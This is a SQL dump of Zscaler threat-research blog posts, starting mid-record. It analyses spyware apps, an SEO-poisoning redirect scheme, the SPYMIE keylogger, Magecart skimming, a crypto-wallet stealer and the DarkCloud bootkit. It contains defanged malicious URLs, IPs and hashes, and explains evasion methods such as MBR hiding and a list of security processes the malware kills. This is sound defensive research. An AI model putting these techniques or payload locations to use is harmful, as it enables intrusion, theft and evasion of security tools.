BasicInfoUpload Service, FileUpload Service, and Upload Service.     As we researched package names, app certificates, and statically collected data, we discovered that this spyware had been uploaded to Google Play in past with the name Soulmate (Beta) and a different package name (com.perfekt.ats.perfektsoulemates). It was taken down immediately. We also came across a lot of advertising for spyware apps that enable users to spy on loved ones. Some of these ads are shown below.         	  		  			  		  		  			Fig 8: Spyware advertisements  		  	           These advertisements took us to the developer\'s official website, apps[.]kikde[.]com. KikDe  promotes itself as a company that provides services to develop websites, Android apps, iOS apps, Windows apps, SEO (Search Engine Optimization), and more. On the KikDe website, we found references to another company called American Transportation System LLC. Tracing this company, we ended up on a third-party website that was still hosting some of its apps. All these apps contained the word  “perfekt” in their titles and it soon became clear that the earlier app named Soulmate was uploaded by this same entity. Other apps by this developer can be seen in the screenshot below along with comparisons to the same apps with different names on Google Play:          	  		  			  		  		  			Fig 9: Third-party vs. Google Play apps  		  	           Other apps from this developer were also highly suspicious. For example, Kikde OTP Monitor could be used for forwarding an OTP (One Time Password) to another mobile device. Kikde Secure+ Keyboard was more of a keylogger. We are continuing our analysis of these apps and will report our findings.          Conclusion     It is always advisable to stay away from “spying” apps. They do have some legitimate use cases, such as parents keeping track of the whereabouts of their children. But as we’ve seen with Soulmate, users can’t be sure of what is happening under the hood, and the user who is spying may actually be the one who is spied upon.    When considering apps to download, users should always exercise caution. Some apps might have good ratings and favorable reviews, but that is not reason enough to trust them, because such ratings and reviews can easily be supplied by the attackers themselves using other identities.     Zscaler protects users from spyware and other malicious apps that call out to C&C servers.', '', 'https://www.zscaler.com/blogs/research/soulmate-dating-app-spies-you');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (17, 'Ubiquitous SEO Poisoning URLs', 'Jim Wang', 'October 17, 2018', 'SEO poisoning, also known as search engine poisoning, is an attack method that involves creating web pages packed with trending keywords in an effort to trick search engines to get a higher ranking in search results. There are different ways to implement SEO poisoning, such as keyword stuffing, the use of hidden text, and cloaking, among others. In addition to manipulating search ranking, SEO poisoning is widely used to redirect users to unwanted applications, phishing, exploit kits and malware, porn, advertisements, and so on.     The ThreatLabZ research team has been actively tracking SEO poisoning campaigns; in this blog, we will share some recent examples and an analysis of the techniques used.     “Midterm elections” campaign    Attackers often use holidays and other timely occasions that are likely to generate a lot of search interest. For this analysis, we chose to focus on the upcoming U.S. election. In the following screenshot, there are three SEO poisoned URLs in the Google search result for the keyword “midterm elections.”         Fig. 1: SEO poisoned URLs in Google search         After about a month of looking at this “midterm elections” SEO poisoning campaign, we found more than 10,000 compromised websites with more than 15,000 keywords, and we continue to find hundreds of newly compromised sites involved in this activity every day.    Use of multiple redirects    Let’s take a look at some specific URLs generated by the following SEO poisoning campaign:    websitedukkani[.]com/enj0qnh/godev3a.php?snlhpyouf=midterm-elections-2018-polls    The Google cache for the above URL is shown below, and you can see that the Google crawler got a junk page loaded up with many uses of the keyword “midterm elections.”         Fig. 2: Google crawler loaded with keywords    But as we browse this URL in Chrome, we discovered that it may be redirected to this page:        Figure 3: SEO poisoning landing page example    We say “may” because the redirected website is different each time.    We also noted that it goes through a series of redirects before landing on the final page, as shown in figure 4 below. This is just one of the many measures that cybercriminals are using to deter automated crawlers from adding detection for the landing pages.    In our example, the user goes through two redirects via the “302 Found” response code before getting to a real page, as shown in figure 3:    Redirect URL #1 - 5[.]45[.]79[.]15/input/?mark=20180314-landlordpeace.com/0fuq&tpl=9&engkey=how+to+login+to+zscaler         Redirect URL #2 - www[.]hitcpm[.]com/watch?key=027ed88f05536b6c1a41df968c0abb52        Figure 4: The web page content of the last redirect    The final landing page that the user sees will be different every time; in our case the user was served the following web page:    best2017games[.]com/bestgames/playtime/6a6d637637c06de629eb725d6c5c34e1/index.php?country_code=US&p1=http%3A%2F%2Fadsfxs.pro%2Fclick%2F05e45367-502f-4558-8e24-9235a5169358%3Fclickid%3DVjN8MTQyNjk4NDh8MTE0NTYyNXwxNTQ2MzZ8MTUyMTA2NzI3M3wyN2RkMDE5MS0xMThjLTRhNWItYjJiYy1mYWI0Nzk2ZTRjMzJ8NzEuMTk3LjIzMS45NXwzfDIwZTdkNzQ3Mzk3MmU5MTllZDQ2NDY0NTI3ZmE0OTcz%26zoneid%3D14269848    The multiple redirect model provides a perfect platform for a MaaS (Malware-as-a-Service) infrastructure, as it shields the final landing page from automated security crawlers.    Cloaking technique    The attackers are leveraging cloaking techniques whereby the end user is served different content depending on the HTTP headers involved in the web request. We noticed three distinct responses in some of the recent campaigns:         	Crawler view: The SEO URL will return a web response that is more catered towards poisoning the search engine results for the relevant search term. This will make the URL appear higher in the search result.  	Browser or user view: The SEO URL in this case will lead the user through a series of redirects before a final landing page, dependent upon the campaign.      The attacker distinguishes between user view and crawler view by inspecting the user-agent HTTP header of the request. If the user-agent string belongs to a well-known web browser, then user view content is served.         	Referer view: The SEO URL in this case will serve different content to the end user, depending on the URL set in the referer HTTP header.      Without cloaking    Without the use of cloaking, the content fetched by the search engine crawler “crawler view” as well as the direct user “direct view” will be identical. However, the SEO page will have scripts to detect whether it is an actual user loading the content in a web browser, in which case the user will be redirected to the final landing page containing the malicious content.    Here is an example of an SEO campaign where cloaking is not being used:    URL:  tucuerposiente[.]cl/forum/070sxjj.php?bbhb=excel-vba-cells-function    The crawler view and direct view for this SEO URL returns identical content. The SEO page in this case will redirect to a final landing page based on the user’s action, such as mouse movement or rendering of the page in the web browser. The crawler will not see the landing page redirect, as there is usually no user interaction or browser rendering involved.    Below is a view of what happens when a user browses an SEO-poisoned URL that is not leveraging cloaking techniques. The user will see a webpage as well as a busy icon on the browser tab indicating additional background activity. This activity is leading the user to the final landing page in the background as shown in this screen capture from Fiddler (a free web request debugging tool).        Figure 5: An SEO poisoned URL without cloaking leads user to landing page    The attacker is leveraging specially crafted CSS (Cascading Style Sheet) to perform a redirect from the user’s browser. In CSS, the URL property can be used to set the background. The figure below shows the typical usage of the URL property (taken from w3schools.com).            Figure 6: URL property    But, if you don’t give any parameter to the URL property, like url() instead of url(“URL”),  it will load the parent page again. During the second loading, however, the referer HTTP header is set to the parent URL itself. This is the reason there are two requests to the same URL in Fiddler. It is important to note that the malicious content will be served on the second request, in which the referer HTTP header is set to the expected URL.    The figure below shows the CSS code snippet used in the SEO page. The line “background-image: url()” will cause the page to reload.        Figure 7: CSS code snippet in the SEO page    The second request will load the malicious code, as shown in the image below.        Figure 8: Malicious code    SEO URL generation    Let’s take a look at a typical SEO URL structure seen in SEO poisoning campaigns:    SEO URL:  sbtechsiteleri[.]com/docs/bmfns7.php?gneo=access-vba-form-load    We can divide this URL into several parts:      	Host:                           www.sbtechsiteleri[.]com  	URI path:                    docs  	PHP page file: bmfns7.php  	Parameter:                 gneo  	Search keywords:      access-vba-form-load      The campaign uses different parameters to generate URLs. We have found hundreds of unique parameters; jtjd and wanh are two examples of parameters shown in the screenshot below.    From the search result in the screenshot, we can reasonably guess there are hundreds of millions of SEO URLs generated for these two parameters.         Figure 9: URLs generated     SEO web page generation    Although we don’t have access to the backend code used to generate the SEO webpages, we can draw some insights into the generation process based on our analysis of several pages involved in this activity:      	Pick up the keywords from the “search keywords”; search in search engine  	Collect the responses that contain the keywords   	Generate a final response containing specific strings from the collected responses      The Google cache of the webpage www.sbtechsiteleri[.]com/docs/bmfns7.php?gneo=access-vba-form-load:         Figure 10: Example of Google cache     The first sentence, “I am fairly new to Access,” can be found in several URLs. The second sentence, “Programming Microsoft Access with VBA can be a lot easier if you know the keyboard shortcuts for the most common commands and tasks and the” is from this site:        Figure 11: Example of site found     Following that sentence, you can see, “If you want to set the RecordSource of another form, you must ensure the other form is open first,” which is from this website:        Figure 12: Example of sentence found at site    All three of the above examples are for the keyword “access.”    Conclusion    SEO URLs redirect users to different targets. We saw two modes of operation in the pages that we analyzed:           	The users go through a series of redirects to reach the final landing page.  	The users are redirected to a MaaS (Malware-as-a-Service) platform which starts another redirection chain leading to final landing page.           Here are the top web categories to which the final landing page sites belonged:    1. Adult and pornographic websites    2. Internet services sites; in this case, the SEO campaign\'s purpose is advertising    3. Politics and religion, an example of which is shown below        4. Exploit servers leading to adware/malware payloads    On an average, we see over 3,000 new and unique SEO poisoned URLs every day. ThreatLabZ is actively tracking this threat and will continue to ensure coverage for Zscaler customers.    Indicators of Compromise    The  list of the redirectors used by this campaign and some IOCs for PHP files and ZIP files can be found here. If you find these PHP or ZIP files in your website, it is likely that your website has been compromised.', '', 'https://www.zscaler.com/blogs/research/ubiquitous-seo-poisoning-urls-0');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (18, 'Why you shouldn\'t trust \"safe\" spying apps!', 'Shivang Desai', 'October 03, 2018', 'During a recent malware hunt, the ZscalerTM ThreatLabZ research team came across a suspicious Android app on Google Play, the official Google app store, named SPYMIE. SPYMIE portrays itself as an Android-based key logger designed for parents to track the cell phone activities of their children. Given the popularity of such apps, it has become common practice for app creators to promote spying capabilities as parental control features. However, SPYMIE packs a little something extra with the parental controls. \r\n\r\nBasically, SPYMIE is an Android-based keylogger that has ability to hide itself and start recording everything the user tries to access. Ideally, keystroke logging is best achieved with keyboard-based apps, but this app uses Android\'s Accessibility Services to perform its functions. The app author also has included their email address in the code of the app, which allows them to receive all the information that the app is collecting, making those using the app vulnerable to having their personal information stolen. \r\n\r\nBefore the app was removed from Google Play, its description was as follows: “SPYMIE: Key logger is specially designed for parents to track the cell phones of your children. It will also help you when someone friends ask you for your phone for ten minutes but you don’t trust on it. So what you have to do you only have to on the SPYMIE: Key Logger. So whenever the friends return phone to you, you can check all the activities done by your friend. It records all the activities that are done on your phone. All activates are send to your mobile phone via email. \r\n\r\n\"For parents what they have to do, you just install the app in your children phone. Hide the icon. Later on you have check all the activities done by your children in the whole day.\"\r\n\r\nZscaler notified Google about the presence of this app and it was immediately removed from Google Play.\r\n\r\n \r\n\r\nApp Details\r\n\r\nName : SPYMIE: Key Logger\r\nPackage Name : com.ant.spymie.keylogger\r\nHash : 8e32ce220e39ba392c9e15671a32854b\r\nSize : 5.5M\r\nInstalls : 10,000+\r\n\r\n \r\n\r\nTechnical Details  \r\n\r\nAs soon as the app is installed, it splashes basic setup activities asking the user for email ID, as shown in screenshot below. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 1: SPYMIE initial activities\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nOnce the introduction is complete, the app asks for runtime permission for managing outgoing calls. The reason for asking this permission is related to the app\'s hiding functionality. As shown in screenshot below, if the user enables the hiding feature, the app then asks for a secret PIN to open the app. The user can then open the app by firing up the phone dialer and entering the PIN. This is the main reason for asking permission related to phone calls.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 2: Hiding functionality \r\n		\r\n	\r\n\r\n\r\n \r\n\r\nAfter further analysis, we found that the app contains a default PIN as well. Dialing **00## would open this keylogger app. The screenshot below shows the code snippet for this functionality. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 3: Default hard-coded PIN\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nOnce the basic setup is done, one can turn on the spying feature. For enabling spying on a user\'s activities, this app uses Accessibility Services. This feature was designed to assist users with disabilities in using Android devices and apps. The below screenshot displays functionality in action: \r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 4: Enabling Accessibility Services\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nOnce Accessibility Services is enabled, the app starts logging every activity performed by the user/victim. The snapshot below shows the code responsible for logging user actions along with keystrokes and storing it in a file named SpyLogger.xml. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 5: Storing user/victim\'s activities \r\n		\r\n	\r\n\r\n\r\n \r\n\r\nIn order to see the functionality in action, we tried running the app in a controlled environment. At first, we opened Gmail and tried composing a sample email. As shown in the screenshot below, almost every activity, from opening the Gmail app (left side) to composing the body of the email, was logged (right side). \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 6: Gmail logging\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n  In another test, we fired up Paytm and tried logging in. The right side of the screenshot below shows how every action was logged. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 7: Paytm login\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe above screenshots display the logs visible in Android\'s logcat command, but behind the scenes, all this data is being written in a file named SpyLogger.xml.  \r\n\r\nLooking from another perspective, the app has a serious vulnerability which, according to OWASP, can be categorized into Insecure Data Storage. Any random app with READ_LOGS permission can read logs presented by Android. In this scenario, all sensitive data is being written to log entries and every piece of sensitive data is at risk. \r\n\r\nAdditionally, this keylogger app can send logged/stolen data to the email ID input by the user during setup, but we found a code snippet that was designed to send this data to another hard-coded email ID as well. The screenshot below shows both the code snippets. The first one is the ideal scenario, in which email is sent to the provided email ID, and the second box shows the app\'s functionality, in which a timer task is run to send email to the hard-coded email ID every 60 seconds. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 8: Sending stolen data to different email IDs\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nDuring our analysis, we did not find any calls made to the second code snippet, where email is sent to the hard-coded email ID, and we believe there are two possible explanations. It is possible that the app\'s author added this functionality while testing and forgot to remove the dead code. This seems unlikely, because the code snippet to send email to the hard-coded email ID is well designed and placed as a timer task to send email every 60 seconds. The second possibility could be related to the app being \"under-construction.\" This app might still be in development and any calls related to this function may be added in future updates. \r\n\r\nConclusion \r\n\r\nWe believe there are two likely scenarios in which key logging apps, like SPYMIE, may be used.\r\n\r\n1. Parents installing spying apps on their children\'s devices\r\n    - Parents can install such apps in order to track their children\'s online activities\r\n2. Users willingly install such an app to steal someone else\'s data.\r\n    - Any user can install such apps on their Android devices and might offer their phone to others for use. When a victim enters his/her personal details, it will be logged. User can view this information at a later time.\r\n\r\nIt is always advisable to stay away from spying apps, because a typical user can never be sure of what exactly is happening under the hood. Be cautious if using mobile devices other than your own. Never perform critical actions or enter personal information on borrowed or unknown devices. Zscaler users are safe from such type of threats. ZscalerTM Sandbox detected the app accurately as shown in screenshot below: \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 9: Zscaler Cloud Sandbox detection', '', 'http://www.zscaler.com/blogs/research/why-you-shouldnt-trust-safe-spying-apps');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (19, 'Magecart campaign remains active', 'Rubin Azad', 'September 28, 2018', 'The Zscaler ThreatLabZ team has been tracking the Magecart campaign for several months. Magecart is a notorious hacker group that has been responsible for large attacks on the e-commerce sites of well-known brands, and we have continued to see its activity during this past month. In this blog, we will examine this campaign’s recent activity and its methods for skimming credit and debit card information for financial gain.    The e-commerce sites targeted by Magecart are being compromised and injected with malicious, obfuscated JavaScript, which, in turn, tries to tap into purchase transactions. Injected script typically adds a form to the payment page at runtime using Document Object Model (DOM) properties. This form captures information such as the site’s domain, credit card details, and the user’s personal information, and then makes a POST request, sending all stolen information to remote site.    Magecart compromise sample    As shown in the screenshot below, the attacker compromises the site and injects a script tag in order to dynamically load a highly obfuscated JavaScript code hosted remotely.        Figure 1: Magecart compromised site    The obfuscated JavaScript code as well as the deobfuscated version of the same can be seen below. This is a common technique leveraged by the attackers to evade detection by security crawlers.    Figure 2: Injected JavaScript code for stealing information    As shown in the image below, this script tries to steal financial and personal information from the form input elements of the target site, and sends the collected information back to the attacker-controlled site.        Figure 3: POST request with stolen information    The domain used by the attacker to host malicious scripts and receive stolen information was registered in early September 2018. This newly registered domain is part of a trend we are seeing that minimizes the attacker\'s chances of getting blocked based on reputation engines, as the site is too new to have a low rating. Fun fact: the attacker also listed this domain for sale.        Figure 4: Attacker’s domain registration    Below are hits we have seen from MageCart campaign in past month.              Figure 5: Campaign activity in past month    Although this campaign is not new, we continue to see newer domains being leveraged and additional e-commerce sites being impacted on a regular basis.    Scripts used in the new and previous campaigns are similar; both domains are hosted on AS24936 Moscow, and may involve the same actor.    Here is a comparison of the deobfuscated JavaScript.        Figure 6: Deobfuscated JavaScript    Sites compromised by Magecart can easily be searched from publicly available data (PublicWWW and Censys.io).         Figure 7: Sites infected with Magecart    Although magentacore[.]net is not responding at the moment, infected domains/URLs can be searched on PublicWWW.    Compromised sites seen recently by ThreatLabZ can be found here.    IOCs    83.166.243[.]206    magento[.]name/mage/mage.js    magento[.]name/mage/mail2.php    magentocore[.]net/mage/mage.js    magentocore[.]net/mage/mail2.php    References:    https://gwillem.gitlab.io/2018/08/30/magentocore.net_skimmer_most_aggressive_to_date/    https://www.riskiq.com/blog/labs/magecart-ticketmaster-breach/    Conclusion:    Attackers are increasingly creative in their methods for generating income, whether through cryptomining, fake tech support scams, or, as in the case of Magecart campaigns, skimming for credit and debit card information. Magecart has been responsible for large-scale attacks on well-known brands, and the ThreatLabZ team will continue to monitor its activities to ensure coverage for Zscaler customers.', 'Compromise;Malware', 'https://www.zscaler.com/blogs/research/magecart-campaign-remains-active');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (20, 'The latest cloud hosting service to serve malware', 'Dhanalakshmi', 'September 19, 2018', 'In recent years, there have been many studies related to compromised cloud hosting services.    It has been reported that these services are increasingly being abused by hackers and malware authors for their malicious online activities. The services enable bad actors to open an inexpensive hosting account, allowing them to hide malicious content in the cloud-based domains of well-known brands, mixing the bad content among the good to prevent the malware from being blacklisted.    In its research, the Zscaler ThreatLabZ team discovered that a popular managed cloud hosting service provider called “Cogeco Peer 1” has been serving phishing attacks and other malware in the wild as far back as February 2018. One of the domains hosted by this service provider, called “flexsel[.]ca,” is distributing a malicious document that installs a crypto-wallet stealer on victims’ machines. Other Cogeco Peer 1 domains are serving various phishing attacks using fake logins for Microsoft, DocuSign, and banking sites.     The below image of hosting IP [64[.]34[.]67[.]205] information shows some of the domains affected by this campaign.        Figure 1: Domains affected by the campaign    The Whois information related to the hosting IP address is as follows:        Figure 2: Whois information on hosting IP address    In this blog, we will provide a technical analysis of two types of attacks served by this campaign in August 2018.    1. Multi crypto-wallet stealer payload delivered through malicious document    2. Microsoft and DocuSign phishing attack    Multi crypto-wallet stealer payload delivered through malicious document:    The crypto-wallet stealers are not new to the information security industry, but we have seen a dramatic increase in their use recently. We found that the domain “http[:]//flexsell[.]ca/,” which is hosted on 64[.]34[.]67[.]205, distributed a malicious document to users during the second week of August 2018. This malicious document downloads and installs a payload with the ability to steal stored crypto-wallets from user machines.    Download link: flexsel[.]ca/myresume/resume_ahmadhammouz[.]doc    Zscaler spotted and blocked this threat over the past two weeks, as shown below:        Figure 3: Unique instances of the malicious document and the final payload downloads as seen by Zscaler    Technical details:    The document, called “resume_ahmadhammouz[.]doc,” has a malicious macro which is executed when the document is opened. It further downloads and executes a crypto-wallet stealer payload on the victim’s machine. This payload tries to steal stored cryptocurrency wallet information, targeting Bitcoin, Electrum, and Monero cryptocurrency wallets.    The obfuscated malicious VB code in the document file is shown below. It initiates an HTTP request to the hardcoded download path of the wallet stealer binary without user intervention.        Figure 4: Obfuscated malicious VB code in the document file    The below Wireshark image shows the payload download on the victim’s machine.         Figure 5: Wireshark screen capture showing download of malicious payload    This malware variant is custom packed. It decrypts and loads an actual wallet stealer file (Borland Delphi compiled) on runtime. Upon execution, the malware collects basic system information, including machine ID, EXE_PATH, Windows, computer (username), screen, layouts, local time, and CPU model. The collected information is sent to a C&C server, which is hardcoded in the file as shown below.        Figure 6: Calls to C&C server    The encrypted POST communication to the C&C server is shown below.             Figure 7: Post-infection communication to the C&C server    The wallet stealer malware searches for the default location of the digital wallet stored on the infected machine, along with browser cookies and login details of popular applications like Pidgin, WinSCP, and Psi+. The following digital wallet files are hunted on a victim’s machine.        Figure 8: Digital wallet files types searched for by malware    The information stored in digital wallet data files includes:      	mbhd.yaml – Contains general preferences and configuration information (theme, exchange, etc.)  	mbhd.checkpoints – A Bitcoin checkpoints file, used when syncing your wallet  	mbhd.spvchain – A Bitcoin block store, used when syncing your wallet      Microsoft and DocuSign Phishing attack:    After exploit kits, phishing is the one of the most significant threats to individuals and organizations today. The dynamic nature of the domains that serve phishing pages, along with the easy hosting features provided by cloud services, magnifies these types of internet attacks.    The Microsoft and DocuSign phishing pages seen in the wild on August 29, 2018, are shown below.        Figure 9: Microsoft and DocuSign phishing pages seen on August 29    The fake Microsoft phishing page image is shown below.        Figure 10: Fake Microsoft phishing page    The DocuSign phishing attack is a tactic used to persuade computer users to enter their account credentials on a fake DocuSign login page. These stolen credentials are used by the attacker to carry out various malicious activities; as a result, the victim’s machine can be infected by other malware.    The following image shows the fake DocuSign login page:        Figure 11: Fake DocuSign login page    Conclusion:    This report covers just one of the active and compromised cloud repositories and the illicit online activities built around it, though these types of attacks have become increasingly common. As individuals and organizations gravitate towards cloud computing, attackers are motivated to host malicious content in the cloud. It is extremely important for cloud hosting service providers to be vigilant in identifying and mitigating attacks on their repositories.    Zscaler ThreatLabZ is monitoring such threats and will continue to ensure coverage for Zscaler customers. The Zscaler Cloud Sandbox report for a sample payload from this campaign is shown below.        Figure 12: Zscaler Cloud Sandbox report on blocked malicious document in the crypto-wallet stealer campaign    IOCs:    Hash:    5608ba844d57727cc821f9fe248ec6ea    98a9964e6e630015688232f08ecf7eb7    74bcd4230c67eba5dd5b34d608454bcd    220c7a665e229beaa22445576350d69e    52536bc70cbacb54160422b73584797a    4e8d5bc0daf0468f854bd972d07f6433    b8a812b43ea18133f38d78b987fe0516    4778714ada548df47f88e7be98e06a63    babecd9045dee2a4bac36c3dc3b4435d    755a77050a511bf5fb61e1d4b004edaa    78d5d85a03b2502f6ecb50371c8299ee    e3f0aec8720ae140215834a17b64d23f    24f3ae8fdddca93f258aef99f984206c    eb7d0f6a68f8447395c9b06f7b561a60    3e6acd8bc6da5c3ef9c135b6bab92199    e0222a5aeab4e4960effdf692c720808    7d33158f1d6a1145cd404751d9645ef5    7b4f0d1f1e85c8e43f4ff2ca11955b41    98a7d159b8af3300744413831035493b    757cbf2cfe780d3c86ebad4fb52041d9    e7d60c8d826a2a9f1829db4b49e7fc09    2b3cff9dbbce4a4d469885e6e9c3e245    975def7af0e548e14c0db8ecf7cf489d    b77c7428bd8efd211a31d1ab774fae43    0d8125afd6adca7d22f08038d0cb3fa3    c9bd4b2099d969a4757487ab553abdf8    c7902322f1b07fc43a6f819a30a10aff    a4432010c73eeb075fb3eb2eae669388    URLs:    adrespotokano[.]info/index[.]php    flexsell[.]ca/myresume/resume_ahmadhammouz[.]doc    162.244.32.180/tyejdsk[.]exe    104.193.252.188/4354r/boxeslimited/536657464[.]png', '', 'https://www.zscaler.com/blogs/research/latest-cloud-hosting-service-serve-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (21, 'DarkCloud Bootkit', 'Nirmal Singh', 'September 13, 2018', 'In an earlier blog about crypto-malware, we described different techniques used by cybercriminals, such as cryptomining and wallet stealing. In this blog, we will provide a technical analysis of yet another type of cryptominer malware using a bootkit and other kernel-level shellcode for persistence.    Installation     The installer is responsible for infecting a system’s master boot record (MBR), which identifies how and where the operating system is located. It opens the boot drive (figure 1) and reads the first 0x400 bytes, which is MBR data.        Figure 1: Opens boot drive    It checks for GUID Partition Table (GPT) partition flag and doesn’t infect GPT disks (see figure 2).        Figure 2: Checking GPT Disk    It moves the clean MBR code from sector 0 to sector 1 (figure 3) and inserts malware code in sector 0 (figure 4). Malicious code is written from sector 2-53.        Figure 3: Clean MBR code        Figure 4: Infected MBR code    Analysis for malicious MBR    Malicious MBR code hooks 15h interrupt (figure 5). It specifically hooks for service 0xE820 of interrupt (int) 15h (figure 6). This service is used to query system memory.        Figure 5: Interrupt 15h hooking        Figure 6: Service 0xE820    After hooking, it loads the original MBR code to resume the booting process. During execution, when bootloader calls int 15h, malware code receives the control and verifies the AddressRangeDescriptor Type, BaseAddrLow, BaseAddrHigh, and LengthLow. After verification, it modifies the LengthLow value to hide the malicious MBR code (figure 7).        Figure 7: Hiding malware code    Loading in kernel    The malware uses different methods, depending on the Windows version, for loading into the kernel. Figure 8 lists the different ways for XP and 7 versions of Windows.        Figure 8: Flow of execution    In Windows XP, it patches code in BlLoadDeviceDriver function in osloader.exe. It also patches code in BlLoadDeviceDriver after it calls to function BlLoadImageEx. The BlLoadImageEx function maps all device drivers in memory. Ntoskrnl.exe will load and execute these drivers (IopInitializeBootDrivers->IopInitializeBuiltinDriver) (figure 9).            Figure 9: Comparison of patched and unpatched code of BlLoadDeviceDriver function    When osloader.exe tries to load the ftdisk.sys driver, it injects malicious shell code in the resource section and a modified entry point to malicious shellcode.        Figure 10: Searching for resource section and comparing section size for shellcode        Figure 11: Malware shellcode in the ftdisk.sys resource section    In Windows 7, the malware searches the address of the OslArchTransferToKernel function from OslpMain (entry point) in winload.exe. OslArchTransferToKernel transfers control to NTOSKRNL.EXE. The malware patches this function (figure 12) to get the loading address of NTOSKRNL.EXE.        Figure 12: Patched OslArchTransferToKernel function code    After getting control to NTOSKRNL.EXE, the malware patches ZwCreateSection API (figure 13).        Figure 13: Patched ZwCreateSection API    Analysis of kernel shellcode1:    This shellcode is responsible for hiding the malicious MBR code and preventing AV products from loading. Shellcode first retrieves the base address of ntoskrnl.exe and gets the address of different APIs. An undocumented field (at offset 0x14) of DRIVE_OBJECT is used to retrieve the  MODULE_ENTRY pointer and enumerated to get base address of ntoskrnl.exe (see figure14).        Figure 14: Searching for base address of ntoskrnl.exe    API names are stored as 32-bit hash values in the code. The ROR13 calculation method is used to generate hash values for each API name (figure 15).        Figure 15: API hash calculation    AntiAV techniques    To stop AV systems from loading, the malware creates notification objects similar to the device names used in 360 AV product device drivers.        Figure 16: Holding AV-related device names    Hiding Malicious MBR code    Different low-level drivers are patched to hide malicious MBR code. In Windows XP, the IdePortStartIo function of atapi.sys is hooked (figure 17).        Figure 17: Hooking IdePortStartIo function of atapi.sys    The hooking function specifically looks for read and write requests (figure 18). If there is a read request for sector 0-61, it hooks CompletionRoutine of IRP sent to atapiDeviceObject and serves a clean MBR code.        Figure 18: Checking SCSI command descriptor block (CDB) for read and write request    If there is a write request for sector 0-61, the malware modifies the operation code in command descriptor block (CDB) and SrbFlags flags of SCSI_REQUEST_BLOCK object. The operation code is changed to 0x28 (SCSIOP_READ) and the SrbFlags are set to SRB_FLAGS_DATA_IN which indicates that it is a read operation. So, the write request is simply converted to a read request and passed to the driver. Figure 19 shows the execution flow of the MBR hiding function.        Figure 19: IdePortStartIo hook function execution flow    Analysis of kernel shellcode 2:    This shellcode executes as a system thread but terminates itself if the system is booting in safe mode. It searches for the explorer.exe process and injects usermode shellcode (referred as ushellcode1 afterword). Ushellcode1 is compressed using LZ compression with COMPRESSION_ENGINE_MAXIMUM flag (figure 20).        Figure 20: First usermode shellcode    Ushellcode1 is injected in explorer.exe with thread data, which is shared memory between the kernel mode thread and ushellcode1 thread, as shown in figure 21. The remote APC thread technique, KeInitializeApc, and KeInsertQueueApc kernel APIs are used to achieve this. It also executes downloaded kernel shellcode by the ushellcode1.        Figure 21: Thread data    In the second step, it searches for processes related to different security software solutions (table 1) and terminates the process.      	  		  			  			Process Names  			  		  		  			  			avp.exe  			  			  			ekrn.exe  			  			  			safedogguardcenter.exe  			  		  		  			  			zhudongfangyu.exe  			  			  			egui.exe  			  			  			wdswfsafe.exe  			  		  		  			  			360tray.exe  			  			  			nod32krn.exe  			  			  			KSafeTray.exe  			  		  		  			  			superkiller.exe  			  			  			avgrsa.exe  			  			  			dwengine.exe  			  		  		  			  			360sd.exe  			  			  			avgui.exe  			  			  			dwarkdaemon.exe  			  		  		  			  			360rps.exe  			  			  			avscan.exe  			  			  			vssery.exe  			  		  		  			  			QQPCRTP.exe  			  			  			v3svc.exe  			  			  			mfemms.exe  			  		  		  			  			systemaidbox.exe  			  			  			v3medic.exe  			  			  			   			  		  		  			  			avgnt.exe  			  			  			Rtvscan.exe  			  			  			   			  		  		  			  			avengine.exe  			  			  			avastsvc.exe  			  			  			   			  		  		  			  			msmpeng.exe  			  			  			bdagent.exe  			  			  			   			  		  		  			  			nissrv.exe  			  			  			mcshield.exe  			  			  			   			  		  		  			  			msseces.exe  			  			  			mcsvhost.exe  			  			  			   			  		  		  			  			ccSvcHst.exe  			  			  			mfefire.exe  			  			  			   			  		  	           Analysis of ushellcode1    This shellcode downloads another shellcode and a config file. The config file is encrypted (using simple XOR) and saved in C:\\Windows\\Temp\\ntuser.dat file.        Figure 22: Downloading config file    The config file contains different URL addresses, used to download further shellcodes and config files. Content of the config file is shown in figure 23. For the IPs mentioned under the main section, it appends the “TestMsg.tmp” string at the end URL to generate a full URL, which serves as shellcode. Similarly, for all the URLs mentioned under section [update] as seen below, it appends string “address.txt” so these URLs are used to download the updated config file.        Figure 23: Config file content    The downloaded shellcode continues to download the final payload using information from the new config file (figure 24). The payload is saved in the %SYSTEMROOT%\\\\TEMP folder with the name conhost.exe (figure 25) and executed with the “-C create -r” parameter.        Figure 24: new config file contents        Figure 25: Download of final payload    Analysis of payload    This payload works as a downloader. During our analysis, we found it downloading a cryptomining tool. It registers itself as a Windows service with name “Windows Audio Control.” It supports different command line options (figure 26), including the main ones: Create, delete, start, and stop services.        Figure 26: Different command line options.    Upon executing without any command, it first downloads xpxmr.dat file that contains a list of C&C IP addresses and URLs. This config file is saved in the C:\\Program Files\\Common Files folder. It also downloads the below config files:      	  		  			  			File Name  			  			  			Description  			  		  		  			  			ver.txt  			  			  			Contains new version of the malware payload; if it does not match the current version, a new version will be downloaded  			  		  		  		